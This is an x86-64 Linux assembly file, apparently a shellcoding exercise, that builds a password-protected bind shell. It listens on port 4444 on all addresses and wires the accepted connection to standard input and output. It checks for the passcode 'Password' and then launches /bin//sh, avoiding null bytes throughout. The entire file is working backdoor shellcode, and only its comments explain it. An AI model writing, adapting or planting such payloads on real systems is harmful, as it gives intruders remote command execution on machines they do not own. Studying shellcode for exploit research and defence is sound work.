global _start
section .text

_start:

	; socket 
	xor rax, rax
	add al, 0x29		; 29 is the hex value of the decimal 41 for socket

	xor rdi, rdi
	add rdi, 0x2		; AF_INET numeric value from PF_INET protocol family

	xor rsi, rsi
	add rsi, 0x1		; SOCK_STREAM constant from socket_type.h

	xor rdx, rdx		; 0 value because of single protocol	

	syscall			; exec socket syscall 

	mov rdi, rax		; move sockfd (file descriptor) value into rdi

	; bind
	xor rax, rax
	push rax

	mov dword [rsp - 4], eax	; listens on all addresses (0.0.0.0)

	mov word [rsp - 6], 0x5c11	; listen on port 4444 (little endian)

	mov word [rsp - 8], 0x2		; AF_INET constant

	sub rsp, 8		; rsp points at the top of the stack

	add al, 0x31		; 31 is the hex value of the decimal 49 for bind
	
	mov rsi, rsp		; rsi now points at address struct at the top of the stack

	xor rdx, rdx
	add rdx, 0x10		; 10 is the decimal 16 that is the size of the address struct

	syscall			; exec bind syscall

	; listen
	xor rax, rax
	add al, 0x32		; 32 is the hex value of the decimal 50 for listen

	xor rsi, rsi
	
	syscall			; exec listen syscall

	; accept
	xor rax, rax
	add rax, 0x2b		; 2b is the hex value of the decimal 43 for accept

	syscall			; exec accept syscall

	mov rdi, rax		; acceptfd

	; dup2 loop
	xor rsi, rsi
	add rsi, 0x3		; set counter to 3

dup2loop:
	xor rax, rax
	add al, 0x21		; 21 is the hex value of the decimal 33 for dup2

	dec rsi			; decrement counter by 1

	syscall			; exec dup2 syscall
	
	jnz dup2loop		; jump to loop if ZF is not zero, else continue

	; read
        xor rax, rax    	; 0 for read syscall

        mov rsi, rsp

        xor rdx, rdx
        add dl, 8		; read size

        syscall			; exec read syscall

        mov rdi, rsp			; password in buffer

        mov rax, 0x64726f7773736150	; "drowssaP"
        
	scasq				; compare string in buffer with passcode
        jnz exit			; if they don't match jmp to exit

	; execve
	xor rax, rax
	push rax

	mov rbx, 0x68732f2f6e69622f	; "hs//nib/"
	push rbx

	mov rdi, rsp		; rdi points at "/bin//sh" at the top of the stack

	push rax		; NULL

	mov rdx, rsp		; rdx points at the top of the stack

	push rdi

	mov rsi, rsp	

	add al, 0x3b		; 3b is the hex value of the decimal 59 for execve        

	syscall			; exec execve syscall

exit:
	xor rax, rax
        add rax, 0x3c		; 3c is the hex value of the decimal 60 for exit

        xor rdi, rdi
	dec rdi			; status

        syscall			; exec exit syscall
